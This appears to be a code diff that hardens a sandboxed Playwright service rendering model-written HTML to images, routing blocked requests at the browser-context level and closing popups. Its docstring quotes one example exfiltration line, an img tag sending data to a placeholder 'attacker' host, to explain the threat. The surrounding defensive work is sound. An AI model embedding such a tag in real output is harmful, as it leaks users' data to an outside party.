@@ -11,9 +11,10 @@ PWA only ever receives an image. Pixels cannot execute.
 
 **The network is off, twice.** The compose service sits on a Docker network declared
 `internal: true`, so the container has no route off the box at all, and every request
-the page attempts is aborted here as well. Model-authored HTML is untrusted input; a
-`<img src="http://attacker/?data=...">` is the obvious exfiltration primitive and
-neither layer alone is a guarantee worth betting owner data on.
+the page (or a popup it opens, which is closed) attempts is aborted here as well.
+Model-authored HTML is untrusted input; a `<img src="http://attacker/?data=...">` is the
+obvious exfiltration primitive and neither layer alone is a guarantee worth betting
+owner data on.
 
 **It never sees owner images.** Callers render a TRANSPARENT overlay and composite it
 over the photograph themselves, back inside the domain firewall. So a health-scoped
@@ -39,6 +40,7 @@ from __future__ import annotations
 
 import asyncio
 import base64
+import contextlib
 import os
 import re
 import struct
@@ -221,8 +223,6 @@ async def render(body: RenderRequest) -> RenderResponse:
     )
     clipped = False
     try:
-        page = await context.new_page()
-
         async def _block(route: object) -> None:
             # The container has no egress anyway; this is the second lock, and it also
             # stops a page hanging on a request that would otherwise time out slowly.
@@ -232,10 +232,24 @@ async def render(body: RenderRequest) -> RenderResponse:
             else:
                 await route.abort()  # type: ignore[attr-defined]
 
-        await page.route("**/*", _block)
-        # `page.route` does not intercept WebSockets. A socket routed here and never connected
-        # to a server is answered by Playwright itself; closing it leaves the page nothing.
-        await page.route_web_socket(_EVERY_URL, _refuse_socket)
+        # Routed on the CONTEXT, not the page: a `window.open` or `target=_blank` form post
+        # opens a second page (Playwright's Chromium runs without a popup blocker), and a
+        # page-scoped route would never see its requests. `route` does not intercept
+        # WebSockets; a socket routed here and never connected to a server is answered by
+        # Playwright itself, and closing it leaves the page nothing.
+        await context.route("**/*", _block)
+        await context.route_web_socket(_EVERY_URL, _refuse_socket)
+        page = await context.new_page()
+
+        async def _close_popup(opened: object) -> None:
+            # Nothing a render needs lives in a second page; close it so it can't run on.
+            # Suppressed: a popup that lands after the context closed fails its own close,
+            # and an unretrieved error in this fire-and-forget handler would only be noise.
+            if opened is not page:
+                with contextlib.suppress(Exception):
+                    await opened.close()  # type: ignore[attr-defined]
+
+        context.on("page", _close_popup)
         await page.set_content(_document(body), wait_until="load", timeout=RENDER_TIMEOUT_MS)
         if body.wait_ms:
             await page.wait_for_timeout(body.wait_ms)
@@ -287,7 +301,7 @@ def _document(body: RenderRequest) -> str:
     # Only an opaque render pins a text colour. A transparent overlay keeps the browser
     # default, so the canvas's html blocks composite exactly as they always have.
     colour = f"color: {ink};" if not body.transparent else ""
-    # `connect-src 'none'` is the lock on what `page.route` never sees on its own: a WebSocket
+    # `connect-src 'none'` is the lock on what `context.route` never sees on its own: a WebSocket
     # (and fetch/XHR/EventSource/beacons, which the route already aborts). It sits in the head,
     # before the caller's fragment, and a later policy can only tighten it, never loosen it.
     return f"""<!doctype html>
